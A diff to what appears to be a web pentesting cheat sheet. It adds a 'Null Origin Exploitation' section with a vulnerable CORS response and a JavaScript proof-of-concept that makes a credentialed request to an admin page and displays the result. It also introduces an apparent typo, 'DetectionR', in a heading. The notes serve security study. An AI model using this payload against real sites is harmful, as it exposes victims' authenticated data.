@@ -4,7 +4,7 @@
 
 ## WAF
 
-### Detection
+### DetectionR
 
 -> Cookies
 
@@ -904,7 +904,30 @@ https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploi
 
 https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery
 
-## Null Origin Exploitati
+## Null Origin Exploitation
+
+-> Identify - Response 
+HTTP/1.1 200 OK  
+...  
+Access-Control-Allow-Origin: null  
+Access-Control-Allow-Credentials: true
+```
+<html><head>
+<script>
+var xhr = new XMLHttpRequest();
+xhr.onreadystatechange = function() {
+	if (xhr.readyState == XMLHttpRequest.DONE) {
+	var r = xhr.responseText;
+	alert(r)
+	}
+}
+xhr.open('GET', 'http://ip/admin.php', true);
+xhr.withCredentials = true;
+xhr.send(null);
+</script>
+</head></html>
+
+```
 
 ## CRLF Injection
   
